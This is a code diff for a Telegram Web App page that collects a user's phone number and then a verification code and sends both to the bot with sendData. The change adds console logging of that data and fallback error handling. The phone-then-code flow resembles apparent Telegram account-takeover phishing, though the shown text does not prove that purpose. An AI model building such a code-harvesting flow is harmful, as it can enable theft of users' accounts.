@@ -342,10 +342,16 @@
             document.getElementById('phoneLoading').classList.add('active');
             
             if (window.Telegram && window.Telegram.WebApp) {
-                window.Telegram.WebApp.sendData(JSON.stringify({
+                const data = JSON.stringify({
                     phone: fullPhoneNumber,
                     code: ''
-                }));
+                });
+                console.log('Отправка данных:', data);
+                window.Telegram.WebApp.sendData(data);
+            } else {
+                showError('phone', 'Ошибка: WebApp не доступен');
+                document.getElementById('phoneBtn').disabled = false;
+                document.getElementById('phoneLoading').classList.remove('active');
             }
         }
         
@@ -362,10 +368,16 @@
             document.getElementById('codeLoading').classList.add('active');
             
             if (window.Telegram && window.Telegram.WebApp) {
-                window.Telegram.WebApp.sendData(JSON.stringify({
+                const data = JSON.stringify({
                     phone: fullPhoneNumber,
                     code: code
-                }));
+                });
+                console.log('Отправка кода:', data);
+                window.Telegram.WebApp.sendData(data);
+            } else {
+                showError('code', 'Ошибка: WebApp не доступен');
+                document.getElementById('codeBtn').disabled = false;
+                document.getElementById('codeLoading').classList.remove('active');
             }
         }
         
